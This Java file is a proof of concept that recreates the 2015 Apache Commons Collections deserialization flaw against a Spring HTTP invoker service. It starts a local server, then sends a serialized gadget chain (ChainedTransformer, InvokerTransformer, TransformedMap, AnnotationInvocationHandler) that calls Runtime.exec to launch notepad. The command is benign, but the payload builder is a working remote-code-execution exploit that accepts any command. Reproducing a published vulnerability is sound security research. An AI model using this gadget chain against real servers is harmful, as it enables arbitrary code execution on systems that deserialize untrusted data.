package com.github.yihtserns.test.serialization.vulnerability;

import com.sun.net.httpserver.HttpHandler;
import java.io.Serializable;
import java.lang.annotation.Annotation;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.springframework.remoting.httpinvoker.HttpInvokerProxyFactoryBean;
import org.springframework.remoting.httpinvoker.SimpleHttpInvokerServiceExporter;
import org.springframework.remoting.support.SimpleHttpServerFactoryBean;
import sun.reflect.annotation.AnnotationType;

/**
 * Recreate issue reported by http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/.
 *
 * @author yihtserns
 */
public class Main {

    public static void main(String[] args) throws Exception {
        final int port = 8089;
        final String path = "/service";

        // Create the legit server
        SimpleHttpServerFactoryBean httpServer;
        {
            SimpleHttpInvokerServiceExporter handler = new SimpleHttpInvokerServiceExporter();
            handler.setServiceInterface(Service.class);
            handler.setService(new Service() {

                @Override
                public void service(Request req) {
                }
            });
            handler.afterPropertiesSet();

            Map<String, HttpHandler> path2Handler = new HashMap<String, HttpHandler>();
            path2Handler.put(path, handler);

            httpServer = new SimpleHttpServerFactoryBean();
            httpServer.setContexts(path2Handler);
            httpServer.setPort(port);
            httpServer.afterPropertiesSet();
        }

        // Malicious client attacks
        {
            HttpInvokerProxyFactoryBean invoker = new HttpInvokerProxyFactoryBean();
            invoker.setServiceUrl("http://localhost:" + port + path);
            invoker.setServiceInterface(FakeInterface.class);
            invoker.afterPropertiesSet();
            FakeInterface service = (FakeInterface) invoker.getObject();

            try {
                Object payload = createMaliciousPayload();
                service.send(payload);
            } finally {
                httpServer.destroy();
            }
        }
    }

    private static Object createMaliciousPayload() throws Exception {
        String execArgs = "cmd.exe /c start notepad";

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", arr(String.class, Class[].class), arr("getRuntime", new Class[0])),
            new InvokerTransformer("invoke", arr(Object.class, Object[].class), arr(null, new Object[0])),
            new InvokerTransformer("exec", arr(String.class), arr(execArgs)),
            new ConstantTransformer(1)
        });

        Class<? extends Annotation> annotationClass = SuppressWarnings.class;

        Map<String, Object> map = new HashMap(AnnotationType.getInstance(annotationClass).memberTypes());
        map = TransformedMap.decorate(map, transformerChain, transformerChain);

        Constructor constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
                .getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        return constructor.newInstance(annotationClass, map);
    }

    private static <T> T[] arr(T... values) {
        return values;
    }

    public interface Service {

        void service(Request req);
    }

    public interface Request extends Serializable {

    }

    public interface FakeInterface {

        void send(Object anything);
    }
}
